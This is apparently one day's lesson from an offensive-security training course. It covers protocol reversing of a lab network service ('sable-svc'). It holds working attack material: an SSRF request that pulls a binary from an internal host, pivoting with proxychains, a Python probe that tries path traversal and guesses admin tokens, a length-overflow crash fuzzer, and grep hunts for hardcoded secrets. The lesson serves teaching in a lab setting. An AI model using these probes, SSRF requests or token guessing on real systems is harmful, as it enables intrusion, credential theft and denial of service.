---
title: "Phase 3 — Network Service Enumeration: Protocol Reversing (sable-svc)"
tags: [ghost-level, binary-analysis, protocol-reversing, network-service,
  reverse-engineering, module-11-ghost-level]
module: 11-GhostLevel
day: 711
prerequisites:
  - Day 710 — Phase 2: Post-Web-Exploitation
  - Day 432 — Ghidra Fundamentals
  - Day 451 — GDB and Dynamic Analysis
related_topics:
  - Day 712 — Phase 3: Binary Reverse Engineering
  - Day 713 — Phase 3: Binary Exploitation
---

# Day 711 — Phase 3: Network Service Enumeration (sable-svc)

> "Before you exploit a binary service, you understand its protocol.
> Every byte the server sends you is information. Every error response
> tells you how the parser works. Map the protocol by hand before
> opening Ghidra — it will tell you exactly which code path to audit."
>
> — Ghost

---

> **ENGAGEMENT CLOCK — CHECK IN**
> Time elapsed: _______ hours | Web phases done: Y / N

---

## Goals

Reverse-engineer the `SABLE Data Broker` binary protocol on port 9000 by
observation alone. Understand all four operation codes. Identify the attack
surface. Obtain the binary via the SSRF from Phase 2 or another method.
Prepare for the exploitation phase on Day 713.

**Target time:** 3–4 hours on enumeration and early binary triage.

---

## 1 — Obtaining the Binary

```bash
# Method 1: If SSRF was found in sable-web (Day 709)
# Use SSRF to read the binary from sable-svc's file system
# (assumes SSRF can reach internal HTTP if sable-svc has one)
curl -sk -X POST \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"url":"http://10.0.1.20:8080/sable_broker"}' \
    http://10.0.1.10/api/v1/reports/generate \
    -o binaries/sable_broker_via_ssrf

# Method 2: If you have a shell on sable-web (pivoting)
proxychains nc -nv 10.0.1.20 9000 </dev/null
# Or use SCP through the pivot to copy the binary

# Method 3: If there is a management port on sable-svc
proxychains nmap -sV -p 21,22,80,8080 10.0.1.20
proxychains curl http://10.0.1.20/ -o binaries/sable_broker 2>/dev/null

# Verify the binary
file binaries/sable_broker
md5sum binaries/sable_broker
# Expected: ELF 32-bit LSB executable, Intel 80386
```

```
BINARY ACQUISITION

Method used: __________________________________________________
Binary obtained: Y / N
file output: _________________________________________________
Size: ________ bytes
Stripped: Y / N  (check: nm binaries/sable_broker | head -5)
```

---

## 2 — Protocol Reverse Engineering by Interaction

Before looking at disassembly, learn the protocol through observation.

```python
#!/usr/bin/env python3
"""
Day 711 — sable_broker protocol probe.
TLV format (from briefing):
  [type: 1 byte] [length: 2 bytes big-endian] [value: length bytes]
"""
import socket
import struct
import sys


def send_tlv(sock: socket.socket, op: int, data: bytes) -> bytes:
    """Send a TLV frame and receive the response."""
    frame = struct.pack(">BH", op, len(data)) + data
    sock.sendall(frame)
    # Read up to 4096 bytes
    response = sock.recv(4096)
    return response


def probe_service(host: str, port: int) -> None:
    """Probe all four operation codes."""
    with socket.create_connection((host, port), timeout=5) as s:

        # Op 0x01: PING — expected: pong or status
        r = send_tlv(s, 0x01, b"")
        print(f"[0x01 PING] → {r.hex()} | {r!r}")

        # Op 0x02: GET — send a key, expect a value
        for key in [b"version", b"status", b"config", b"users",
                    b"../etc/passwd", b"AAAA"]:
            r = send_tlv(s, 0x02, key)
            print(f"[0x02 GET key={key!r}] → {r!r}")

        # Op 0x03: PUT — try to store something
        r = send_tlv(s, 0x03, b"testkey\x00testvalue")
        print(f"[0x03 PUT] → {r!r}")

        # Op 0x04: ADMIN — likely restricted
        r = send_tlv(s, 0x04, b"")
        print(f"[0x04 ADMIN no-token] → {r!r}")

        # Test authentication for ADMIN (try common tokens)
        for token in [b"admin", b"root", b"debug", b"SABLE", b"\x00" * 8]:
            r = send_tlv(s, 0x04, token)
            print(f"[0x04 ADMIN token={token!r}] → {r!r}")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "10.0.1.20"
    probe_service(host, 9000)
```

```bash
python3 probe.py 10.0.1.20 2>&1 | tee recon/svc_probe.txt
```

```
PROTOCOL PROBE RESULTS

Op 0x01 PING response: ________________________________________
  → Protocol confirmed: Y / N

Op 0x02 GET responses:
  key="version": ______________________________________________
  key="status":  ______________________________________________
  key="config":  ______________________________________________
  key="users":   ______________________________________________
  Path traversal key: __________________________________________

Op 0x03 PUT response: __________________________________________
  → Write accepted: Y / N

Op 0x04 ADMIN (no token): ______________________________________
Op 0x04 ADMIN (with token "admin"): ____________________________
  → Admin access with token: Y / N  Token: ____________________

ANOMALIES / CRASHES DURING PROBING:
  Crash observed: Y / N
  Trigger: _____________________________________________________
```

---

## 3 — Fuzzing the Protocol for Crashes

```python
#!/usr/bin/env python3
"""
Day 711 — Targeted fuzz probe for crash conditions.
Focus: length field manipulation (integer overflow / OOB).
"""
import socket
import struct
import time


def send_raw(host: str, port: int, payload: bytes) -> bytes | None:
    try:
        with socket.create_connection((host, port), timeout=3) as s:
            s.sendall(payload)
            return s.recv(4096)
    except (ConnectionResetError, TimeoutError, OSError):
        return None   # connection refused or reset = crash candidate


def fuzz(host: str, port: int) -> None:
    cases = [
        # Oversized length in GET
        struct.pack(">BH", 0x02, 0xFFFF) + b"A" * 64,
        struct.pack(">BH", 0x02, 0x7FFF) + b"A" * 64,

        # Length = 0 for all ops
        *[struct.pack(">BH", op, 0) for op in [0x01, 0x02, 0x03, 0x04]],

        # Length says 100, but only send 4 bytes (truncated)
        struct.pack(">BH", 0x02, 100) + b"AAAA",

        # Invalid op codes
        *[struct.pack(">BH", op, 4) + b"TEST" for op in [0x05, 0xFF, 0x00]],

        # Very long PUT value
        struct.pack(">BH", 0x03, 2048) + b"B" * 2048,
    ]

    for i, case in enumerate(cases):
        resp = send_raw(host, port, case)
        if resp is None:
            print(f"[!] POSSIBLE CRASH — case {i}: {case[:16].hex()}…")
        else:
            print(f"[case {i}] resp: {resp[:16].hex()}")
        time.sleep(0.2)


fuzz("10.0.1.20", 9000)
```

```
CRASH PROBE RESULTS

Case that causes no response / connection reset:
  Payload (hex): ________________________________________________
  Length value that triggers: __________________________________
  Operation code affected: _____________________________________

Crash reproducible: Y / N
Service recovers on its own: Y / N
```

---

## 4 — Static Binary Triage

```bash
# Initial binary analysis
strings binaries/sable_broker | tee recon/svc_strings.txt

# Key string analysis
grep -iE "malloc|alloc|free|memcpy|strcpy|sprintf|gets|read" \
    recon/svc_strings.txt

# Search for error messages that reveal code paths
grep -iE "error|invalid|overflow|exceed|limit|version|admin|auth|token" \
    recon/svc_strings.txt | head -20

# Check for hardcoded admin token
grep -iE "admin_token|secret|password|key" recon/svc_strings.txt

# Import table (what C functions are called)
objdump -d -j .plt binaries/sable_broker | grep "<" | grep -v "@"
# Or:
readelf -d binaries/sable_broker | grep "(NEEDED)"
nm binaries/sable_broker 2>/dev/null | grep "U " | awk '{print $3}'
```

```
BINARY TRIAGE

Interesting strings:
  Error messages that reveal operations: _______________________
  Hardcoded token / credential: ________________________________
  Dangerous C functions imported: ______________________________
    malloc: Y / N   free: Y / N   memcpy: Y / N
    strcpy: Y / N   sprintf: Y / N   gets: Y / N

Binary metadata:
  Stripped: Y / N
  PIE enabled: Y / N  (checksec or readelf -d)
  Stack canary: Y / N
  NX bit: Y / N
  RELRO: None / Partial / Full

Hypotheses from triage (what bug class to hunt in Ghidra):
  H1: ___________________________________________________________
  H2: ___________________________________________________________
```

---

## Navigation

← Previous: [Day 710 — Phase 2: Post-Web-Exploitation](DAY-0710-Phase2-PostWeb-Internal-Discovery.md)
→ Next: [Day 712 — Phase 3: Binary Reverse Engineering (sable-svc)](DAY-0712-Phase3-Binary-Reversing.md)
